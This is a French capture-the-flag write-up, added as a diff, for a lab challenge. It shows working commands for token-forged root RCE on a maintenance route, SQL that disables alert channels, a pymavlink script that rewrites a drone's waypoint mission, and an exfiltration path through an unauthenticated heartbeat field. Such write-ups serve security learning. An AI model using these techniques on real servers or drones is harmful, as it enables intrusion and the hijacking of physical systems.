@@ -1,0 +1,252 @@
+Source locale : canry/writeup-CANARY.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# Canary — Janus / update.nrv (Misc, 200 pts)
+
+## Objective
+
+Neutraliser le dead-man's switch du centre de diffusion JANUS avant l'échéance :
+désactiver les canaux d'alerte armés et dérouter la mission MAVLink du drone
+NRV-RAVEN vers la zone de repli. Le checker ne rend le verdict et n'écrit le
+flag qu'à la fin du compte à rebours.
+
+Cible : `172.28.0.2:80` (IP propre à l'instance ; le nom logique est
+`update.nrv`).
+
+## Reconnaissance
+
+La télémétrie publique donne l'état du drone, de la fuite et la zone de repli :
+
+```bash
+curl -s http://172.28.0.2/api/telemetry | python3 -m json.tool
+```
+
+Points utiles : `agent NRV-FIELD-042`, `dropzone [46.2103,6.1502]`,
+`safe_coord "46.045,5.87"`, `remaining` (échéance), `verdict ARMED`.
+
+La racine redirige vers `/login`, mais `/.DS_Store` est servi hors whitelist :
+
+```bash
+curl -s http://172.28.0.2/.DS_Store -o ds
+strings -e b -n 3 ds
+# app.js, console.js, favicon.ico, logo-norsec.png, style.css,
+# architecture-infra-janus-v3.pdf
+```
+
+Le PDF d'architecture est public et fuit le compte admin par défaut, ainsi que
+l'existence d'un miroir PyPI interne :
+
+```bash
+curl -s -O http://172.28.0.2/architecture-infra-janus-v3.pdf
+pdftotext -layout architecture-infra-janus-v3.pdf -
+```
+
+Identifiants admin (lecture seule) : `admin` + mot de passe du PDF.
+
+## Accès initial — RCE root via corp-auth
+
+Le miroir Simple expose trois paquets maison :
+
+```bash
+curl -s http://172.28.0.2/pypi/simple/
+# corp-auth/ corp-logging/ corp-utils/
+```
+
+Les liens du Simple pointent vers `/packages/...` (404). Les archives réelles
+sont sous `/pypi/packages/` :
+
+```bash
+curl -s -O http://172.28.0.2/pypi/packages/corp_auth-1.2.0.tar.gz
+tar xzf corp_auth-1.2.0.tar.gz
+sed -n '1,240p' corp_auth-1.2.0/corp_auth/middleware.py
+```
+
+Le middleware contient un secret SSO en clair et dérive un jeton de
+maintenance :
+
+```python
+_SSO_SECRET = <SECRET_EXPURGE>
+_MAINT_HASH = hashlib.sha256(
+    f'{_SSO_SECRET}::maintenance'.encode()
+).hexdigest()[:32]
+```
+
+La route `/_internal/diag` est enregistrée avant le contrôle de session et
+accepte `action=exec` avec `X-Maint-Token: <_MAINT_HASH>` :
+
+```bash
+TOK=$(python3 - <<'PY'
+import hashlib
+print(hashlib.sha256(b'<EXPURGE>::maintenance').hexdigest()[:32])
+PY
+)
+curl -s -H "X-Maint-Token: $TOK" \
+  "http://172.28.0.2/_internal/diag?action=exec&cmd=id"
+# uid=0(root)
+```
+
+Un helper local (`rce.py`) encode la commande et renvoie stdout/stderr.
+
+## Comprendre le checker
+
+Le verdict est un volume monté en lecture seule dans le relais :
+
+```bash
+cat /verdict/status.json
+```
+
+Exemple observé :
+
+```json
+{"remaining": 223, "channels_safe": true, "drone_safe": true,
+ "verdict": "ARMED", "safe_coord": "46.045,5.87"}
+```
+
+Contraintes :
+
+- `channels_safe` : aucune ligne `alert_channels.active = TRUE` pour l'alerte
+  armée ;
+- `drone_safe` : calculé depuis la vraie mission MAVLink du drone, pas depuis
+  `data/telemetry.json` (leurre) ;
+- le flag n'est écrit dans `/verdict/flag` que lorsque `remaining = 0` **et**
+  que les deux conditions sont vraies.
+
+L'alerte armée est l'alerte `id=2` (`JANUS-DOSSIER-002 — Interceptions TCDA`),
+planifiée à l'échéance.
+
+## Neutralisation des canaux
+
+Les identifiants PostgreSQL sont dans l'environnement du relais :
+
+```text
+DB_HOST=db DB_PORT=5432 DB_NAME=janus_relay
+DB_USER=relay DB_PASS=<SECRET_EXPURGE>
+```
+
+Via la RCE et `psycopg2` :
+
+```sql
+SELECT id, alert_id, channel_name, active FROM alert_channels ORDER BY id;
+UPDATE alert_channels SET active = FALSE WHERE alert_id = 2;
+SELECT id, name, enabled FROM channels ORDER BY id;
+UPDATE channels SET enabled = FALSE;
+```
+
+Contrôle :
+
+```sql
+SELECT COUNT(*) FROM alert_channels WHERE alert_id = 2 AND active = TRUE;
+-- 0
+```
+
+## Déroutement du drone
+
+Le poste terrain `NRV-FIELD-042` exécute les hooks des jobs JSON déposés dans
+`/opt/webapp/jobs/`. Le job de déroutement est récupéré via
+`GET /api/field/jobs?agent=NRV-FIELD-042` et exécuté par
+`subprocess.run(hook, shell=True)`.
+
+Le hook écrit un script `pymavlink` en base64 puis l'exécute. Points clés :
+
+- connexion `udpout:drone:14550` ;
+- lecture du `mission_count` courant (4) : le SITL ACK un count arbitraire sans
+  remplacer la mission ;
+- réupload de 4 waypoints identiques sur la zone de repli, pour que le terminal
+  reste sûr même quand le drone progresse en AUTO.
+
+Squelette du script :
+
+```python
+from pymavlink import mavutil
+
+m = mavutil.mavlink_connection(
+    "udpout:drone:14550", dialect="common",
+    source_system=255, source_component=190)
+m.wait_heartbeat(timeout=5)
+
+wps = [(46.045, 5.87, 100.0)] * 4
+m.mav.mission_count_send(m.target_system, m.target_component, len(wps))
+
+sent = set()
+while len(sent) < len(wps):
+    msg = m.recv_match(type=['MISSION_REQUEST_INT', 'MISSION_REQUEST',
+                             'MISSION_ACK'], blocking=True, timeout=5)
+    if msg is None:
+        break
+    if msg.get_type() == 'MISSION_ACK':
+        break
+    seq = msg.seq
+    if seq in sent:
+        continue
+    lat, lon, alt = wps[seq]
+    m.mav.mission_item_int_send(
+        m.target_system, m.target_component, seq,
+        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
+        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+        0, 1, 0, 0, 0, 0,
+        int(lat * 1e7), int(lon * 1e7), alt)
+    sent.add(seq)
+```
+
+Exfiltration de la sortie du poste terrain : l'ack `/api/field/jobs/<id>/ack`
+exige une session. Deux contournements possibles :
+
+- poster la sortie dans le champ `version` de `/api/field/heartbeat`
+  (non authentifié), puis lire `agents.current_version` en base ;
+- poster l'ack avec le cookie de session admin.
+
+## Vérification
+
+La télémétrie recalculée par le poste terrain devient :
+
+```json
+{"drone": {"count": 4, "terminal": [46.045, 5.87],
+           "dist_to_dropzone": 28357, "diverted": true,
+           "release": "ABORT", "bay": "DÉROUTÉE"}}
+```
+
+Puis, à l'échéance (`remaining = 0`) :
+
+```json
+{"remaining": 0, "channels_safe": true, "drone_safe": true,
+ "verdict": "DEFUSED", "safe_coord": "46.045,5.87"}
+```
+
+`/verdict/flag` apparaît alors et contient la valeur attendue.
+
+## Chemins qui ont échoué
+
+- Falsifier `data/telemetry.json` : sans effet, le checker lit la mission
+  MAVLink réelle.
+- Liens du Simple Index PyPI (`/packages/...`) : 404 ; utiliser
+  `/pypi/packages/...`.
+- `mission_count` arbitraire : le SITL ACK mais conserve l'ancienne mission.
+  Il faut réutiliser le count courant.
+- Ack du poste terrain avec la session par défaut : redirigé vers `/login`,
+  sortie perdue ; passer par le heartbeat ou un cookie admin.
+- Lire le flag avant `remaining = 0` : fichier absent.
+
+## Validation reproductible
+
+1. `curl -s http://$TARGET/api/telemetry` : relever `safe_coord`, `dropzone`,
+   `remaining`.
+2. `curl -s -H "X-Maint-Token: $TOK" ".../_internal/diag?action=exec&cmd=id"`
+   → `uid=0(root)`.
+3. SQL : `SELECT COUNT(*) FROM alert_channels WHERE alert_id = 2 AND active = TRUE;`
+   → `0`.
+4. `pymavlink` ou télémétrie : dernier waypoint `46.045,5.87`,
+   `dist_to_dropzone > 300`.
+5. `cat /verdict/status.json` : `channels_safe: true`, `drone_safe: true`.
+6. À `remaining = 0`, `cat /verdict/flag` : le flag est présent (valeur non
+   recopiée ici).
+
+## Leçons apprises
+
+- Les fichiers de métadonnées macOS (`.DS_Store`) restent une source fiable de
+  découverte de fichiers « cachés ».
+- Les paquets internes miroirés exposent souvent des secrets et des routes de
+  maintenance oubliées.
+- Un fichier de télémétrie applicatif n'est pas une preuve : toujours remonter
+  à la source de vérité (ici la mission MAVLink).
+- Les protocoles de mission MAVLink sont sensibles au nombre d'items : relire
+  l'état avant de réécrire.
